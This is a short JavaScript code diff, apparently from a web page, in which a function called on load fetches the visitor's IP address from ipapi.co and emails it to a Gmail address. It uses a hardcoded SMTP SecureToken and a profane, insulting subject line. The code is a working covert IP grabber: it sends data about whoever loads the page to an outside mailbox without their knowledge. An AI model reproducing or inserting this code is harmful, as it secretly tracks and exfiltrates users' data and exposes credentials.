@@ -16,13 +16,14 @@ const getIp = () => {
   fetch("https://ipapi.co/json/")
     .then((response) => response.json())
     .then((data) => {
-      console.log(data.ip);
       Email.send({
         SecureToken: "6159cc5f-8436-4273-8e76-f9620c4bda2f",
         To: "walden.devbusiness@gmail.com",
         From: "walden.devbusiness@gmail.com",
         Subject: "IP KURWY",
         Body: data.ip,
+      });
+    });
 };
 
 getIp();
